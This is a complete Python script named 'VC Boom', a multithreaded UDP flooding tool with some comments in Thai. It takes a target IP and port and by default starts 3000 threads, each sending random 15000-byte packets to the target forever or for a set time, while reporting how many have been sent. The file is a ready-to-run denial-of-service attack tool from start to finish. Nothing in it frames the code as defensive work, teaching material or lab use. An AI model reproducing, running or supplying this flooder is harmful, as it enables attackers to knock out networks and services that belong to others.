#!/usr/bin/env python3
"""
VC Boom - High performance UDP flooder
Usage: python3 vcboom.py <IP> <PORT> [THREADS] [DURATION] [PACKET_SIZE]

Default:
  THREADS      = 3000
  DURATION     = 0 (infinite)
  PACKET_SIZE  = 15000
"""
import sys
import socket
import threading
import random
import time

# ── Parse args ──
if len(sys.argv) < 3:
    print("Usage: vcboom.py <IP> <PORT> [THREADS] [DURATION] [PACKET_SIZE]")
    sys.exit(1)

TARGET_IP   = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
THREADS     = int(sys.argv[3]) if len(sys.argv) > 3 else 3000
DURATION    = int(sys.argv[4]) if len(sys.argv) > 4 else 0   # 0 = infinite
PACKET_SIZE = int(sys.argv[5]) if len(sys.argv) > 5 else 15000

# ── ลด stack size ของ thread ลงเหลือ 256KB ──
threading.stack_size(256 * 1024)

# ── สถิติรวม (thread-safe ด้วย GIL เพียงพอสำหรับ counter) ──
total_sent   = 0
total_errors = 0
lock         = threading.Lock()

# ── สร้าง payload ครั้งเดียวต่อ thread ไม่ต้องสุ่มใหม่ทุกรอบ ──
def make_payload():
    return random._urandom(PACKET_SIZE)

def attack(deadline):
    global total_sent, total_errors
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, "SO_REUSEPORT"):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        # buffer ใหญ่ขึ้นเพื่อลดการ block
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except Exception:
        pass

    payload = make_payload()
    target  = (TARGET_IP, TARGET_PORT)
    sent    = 0
    errs    = 0

    while True:
        if deadline and time.time() >= deadline:
            break
        try:
            sock.sendto(payload, target)
            sent += 1
        except Exception:
            errs += 1
            if errs > 1000:          # ถ้า error ติดกันเยอะ แสดงว่าเป้าปิดจริง
                break
            continue
        # ทุก 5000 packet อัปเดตสถิติรวม (ลด lock overhead)
        if sent % 5000 == 0:
            with lock:
                total_sent   += sent
                total_errors += errs
            sent = 0
            errs = 0

    with lock:
        total_sent   += sent
        total_errors += errs
    try:
        sock.close()
    except Exception:
        pass

def main():
    deadline = (time.time() + DURATION) if DURATION > 0 else None

    print(f"[VCBOOM] target={TARGET_IP}:{TARGET_PORT} "
          f"threads={THREADS} duration={DURATION or 'inf'} "
          f"pkt={PACKET_SIZE}B")

    workers = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack, args=(deadline,), daemon=True)
        t.start()
        workers.append(t)

    try:
        while True:
            time.sleep(1)
            with lock:
                print(f"[VCBOOM] sent={total_sent:,} errors={total_errors:,}", flush=True)
            if deadline and time.time() >= deadline:
                break
    except KeyboardInterrupt:
        print("\n[VCBOOM] stopped by user")

    print("[VCBOOM] done")

if __name__ == "__main__":
    main()